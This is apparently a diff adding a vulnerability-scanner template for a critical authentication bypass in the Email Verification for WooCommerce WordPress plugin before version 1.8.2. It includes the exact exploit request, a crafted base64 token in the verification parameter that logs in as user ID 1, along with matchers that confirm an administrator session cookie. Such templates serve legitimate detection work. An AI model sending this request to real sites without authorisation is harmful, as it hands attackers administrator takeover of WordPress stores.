@@ -1,0 +1,45 @@
+id: wp-woocommerce-email-verification
+
+info:
+  name: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
+  author: random_robbie,daffianfo
+  severity: critical
+  description: |
+    Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.
+  reference:
+    - https://wpvulndb.com/vulnerabilities/10318
+    - https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8
+  classification:
+    cvss-metrics: CVSS:10.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-288
+  tags: woocommerce,wp,wpscan,wordpress,wp-plugin
+  metadata:
+    max-request: 2
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
+      - "{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "wordpress_logged_in_[a-z0-9]{32}"
+
+      - type: word
+        part: body
+        words:
+          - "Your account has been activated!"
+          - "From your account dashboard you can view your"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/31
